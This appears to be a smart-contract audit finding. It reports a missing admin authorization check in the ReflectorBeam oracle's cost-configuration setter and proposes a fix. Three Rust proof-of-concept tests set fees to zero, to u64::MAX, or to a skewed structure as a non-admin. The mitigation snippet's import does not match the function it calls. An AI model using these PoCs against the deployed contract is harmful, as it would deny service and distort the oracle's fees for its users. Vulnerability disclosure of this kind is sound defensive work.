# Vulnerability Details

The vulnerability is located in the `set_costs_config` function within `beam-contract/src/cost.rs`. This function is called by the public-facing `set_invocation_costs_config` function in `beam-contract/src/lib.rs`.

The core issue is the complete absence of an authorization check in the function that writes the cost configuration to storage.

**Vulnerable Entrypoint Function:**  
https://github.com/code-423n4/2025-10-reflector/blob/21676f3d353ed72e53d53ee9a3538542221a1cb2/beam-contract/src/cost.rs#L26

```rust
// File: beam-contract/src/lib.rs

    // ...
    // Requires admin authorization
    // ...
    pub fn set_invocation_costs_config(e: &Env, config: Vec<u64>) {
        set_costs_config(e, &config);
    }
```

**Root Cause - Missing Authorization Check:**  
https://github.com/code-423n4/2025-10-reflector/blob/21676f3d353ed72e53d53ee9a3538542221a1cb2/beam-contract/src/cost.rs#L26

```rust
// File: beam-contract/src/cost.rs

// Update invocation costs config
#[inline]
pub fn set_costs_config(e: &Env, costs: &Vec<u64>) {
    e.storage().instance().set(&COST_CONFIG_KEY, &costs);
}
```

# Finding Description and Impact

## Description

The `set_invocation_costs_config()` function, which is responsible for setting the entire fee structure for the ReflectorBeam oracle, is critically missing an authorization check. The function's comments explicitly state that it **Requires admin authorization**, but the implementation fails to enforce this requirement.

The public `set_invocation_costs_config` function in `beam-contract/src/lib.rs` simply delegates the call to the internal `set_costs_config` function in `beam-contract/src/cost.rs`. The internal function then proceeds to overwrite the cost configuration in storage without any verification of the caller's permissions.

This oversight is inconsistent with other administrative functions in the protocol, such as `set_cache_size`, which are correctly protected by authorization checks. This confirms that the lack of protection is a bug rather than a design choice. As a result, any user or contract can gain complete control over the oracle's fee mechanism.

## Impact

The impact of this vulnerability is critical and poses an existential threat to the ReflectorBeam service. It allows any actor to completely undermine the protocol's economic security model in several ways:

- **Denial of Service (DoS)**: An attacker can render the oracle unusable for all legitimate users by calling `set_invocation_costs_config` with impossibly high values (e.g., `u64::MAX`). This would make every oracle query prohibitively expensive.

- **Economic Drain and System Collapse**: An attacker can set all fees to zero. This would incentivize users to drain the computational resources of node operators for free. Since node operators would no longer be compensated for their work, they would be forced to shut down, leading to a collapse of the oracle's data provision service and the entire network.

- **Economic Manipulation and Targeted Resource Exhaustion**: A sophisticated attacker can create perverse economic incentives. For example, they could make simple, low-resource queries extremely expensive while making complex, computationally intensive queries (like TWAP) free. This would manipulate user behavior and could be used to launch targeted resource exhaustion attacks on the nodes.

In summary, this single point of failure grants any unauthorized party the power to bankrupt the system, deny service to all users, and fundamentally break the ReflectorBeam product.

# Recommended Mitigation Steps

The fix is straightforward and essential. An admin authorization check must be added to the `cost::set_costs_config` function to ensure that only the authorized multisig admin can modify the fee structure. This will align the implementation with the documented intention and secure the function.

**File:** `beam-contract/src/cost.rs`

```rust
// Recommended change
use oracle::auth::require_admin;

// Update invocation costs config
#[inline]
pub fn set_costs_config(e: &Env, costs: &Vec<u64>) {
    auth::panic_if_not_admin(e); // <<< ADD THIS AUTHORIZATION CHECK
    e.storage().instance().set(&COST_CONFIG_KEY, &costs);
}
```

# Proof of Concept

The following three tests can be added to the project's test suite to demonstrate the vulnerability and its impact.

## PoC 1: Direct Attack Demonstrating Unauthorized Cost Modification

```rust
#[test]
fn poc_unauthorized_cost_modification() {
    let (env, client, init_data) = init_contract_with_admin();
    
    // 1. Verify initial state - default cost configuration
    let original_costs = client.invocation_costs();
    let expected_defaults = Vec::from_array(&env, [2_000_000, 10_000_000, 15_000_000, 20_000_000, 30_000_000]);
    assert_eq!(original_costs, expected_defaults);
    
    // 2. Create a malicious attacker account (non-admin)
    let attacker = Address::generate(&env);
    
    // 3. Attacker attempts to modify cost configuration - this should fail but actually succeeds!
    // Note: We don't need mock_all_auths because this function has no permission check
    
    // Attack scenario 1: Set all costs to 0, allowing users to use service for free
    let malicious_costs_free = Vec::from_array(&env, [0, 0, 0, 0, 0]);
    
    // Attack scenario 2: Set costs to extremely high values, preventing normal users from using
    let malicious_costs_expensive = Vec::from_array(&env, [
        u64::MAX, u64::MAX, u64::MAX, u64::MAX, u64::MAX
    ]);
    
    // Execute attack 1: Free service attack
    client.set_invocation_costs_config(&malicious_costs_free);
    let modified_costs = client.invocation_costs();
    assert_eq!(modified_costs, malicious_costs_free);
    std::println!(" Attack successful! Attacker set all invocation costs to 0");
    
    // Execute attack 2: Denial of service attack
    client.set_invocation_costs_config(&malicious_costs_expensive);
    let expensive_costs = client.invocation_costs();
    assert_eq!(expensive_costs, malicious_costs_expensive);
    std::println!(" Attack successful! Attacker set invocation costs to extremely high values");
    
    // 4. Verify economic impact
    // Set fee configuration to test actual impact
    let fee_asset = env.register_stellar_asset_contract_v2(init_data.admin.clone()).address();
    let fee_config = FeeConfig::Some((fee_asset.clone(), 1_000_000));
    
    env.mock_all_auths(); // Only admin operations need mock
    client.set_fee_config(&fee_config);
    
    // Test impact of free calls
    client.set_invocation_costs_config(&malicious_costs_free);
    let free_cost = client.estimate_cost(&InvocationComplexity::Price, &1);
    assert_eq!(free_cost, 0);
    std::println!(" Economic impact: Users can now call price query service for free");
    
    // Test impact of high costs
    client.set_invocation_costs_config(&malicious_costs_expensive);
    let expensive_cost = client.estimate_cost(&InvocationComplexity::Price, &1);
    assert!(expensive_cost > 1_000_000_000_000_000i128); // Extremely high cost
    std::println!(" Economic impact: Normal users cannot afford such high invocation costs");
}
```

## PoC 2: Comparison with a Properly Secured Admin Function

```rust
#[test] 
fn poc_compare_with_proper_admin_function() {
    let (env, client, init_data) = init_contract_with_admin();
    
    // Create non-admin user
    let non_admin = Address::generate(&env);
    
    // 1. Try to call function that requires admin privileges (should fail)
    let new_cache_size = 100u32;
    
    // Don't use mock_all_auths, so permission checks will be effective
    env.cost_estimate().budget().reset_unlimited();
    
    // This call should panic because it has permission check
    // client.set_cache_size(&new_cache_size); // This would panic
    
    // 2. But calling set_invocation_costs_config succeeds (vulnerability)
    let malicious_costs = Vec::from_array(&env, [1, 1, 1, 1, 1]);
    client.set_invocation_costs_config(&malicious_costs); // Doesn't panic!
    
    let result = client.invocation_costs();
    assert_eq!(result, malicious_costs);
    
    std::println!(" Comparison results:");
    std::println!("   - set_cache_size: Has permission check, non-admin cannot call");
    std::println!("   - set_invocation_costs_config: No permission check, anyone can call!");
}
```

## PoC 3: Realistic Economic Manipulation Scenario

```rust
#[test]
fn poc_real_world_attack_scenario() {
    let (env, client, init_data) = init_contract_with_admin();
    
    // Set up real fee environment
    let fee_asset = env.register_stellar_asset_contract_v2(init_data.admin.clone()).address();
    let fee_config = FeeConfig::Some((fee_asset.clone(), 1_000_000)); // Daily fee
    
    env.mock_all_auths();
    client.set_fee_config(&fee_config);
    
    // Create normal user
    let normal_user = Address::generate(&env);
    let fee_token = StellarAssetClient::new(&env, &fee_asset);
    fee_token.mint(&normal_user, &100_000_000); // Give user some tokens
    
    // Normal invocation cost
    let normal_cost = client.estimate_cost(&InvocationComplexity::Price, &1);
    std::println!(" Normal invocation cost: {}", normal_cost);
    
    // Attacker modifies cost configuration
    let attacker = Address::generate(&env);
    
    // Attack scenario: Set unreasonable cost structure
    let attack_costs = Vec::from_array(&env, [
        0,           // NModifier = 0 (free multiplier correction)
        1_000_000_000, // Price = extremely high (basic price query becomes very expensive)
        0,           // Twap = 0 (TWAP query free)
        0,           // CrossPrice = 0 (cross price free) 
        0,           // CrossTwap = 0 (cross TWAP free)
    ]);
    
    // Execute attack
    client.set_invocation_costs_config(&attack_costs);
    
    // Verify attack effects
    let price_cost = client.estimate_cost(&InvocationComplexity::Price, &1);
    let twap_cost = client.estimate_cost(&InvocationComplexity::Twap, &1);
    
    std::println!(" Post-attack cost structure:");
    std::println!("   - Basic price query: {} (extremely expensive)", price_cost);
    std::println!("   - TWAP query: {} (free)", twap_cost);
    
    // This attack could lead to:
    // 1. Users avoiding expensive basic price queries
    // 2. Heavy use of free TWAP queries, potentially causing service overload
    // 3. Disruption of expected economic model and revenue structure
    
    assert!(price_cost > 100_000_000); // Basic query becomes extremely expensive
    assert_eq!(twap_cost, 0); // TWAP query free
}
```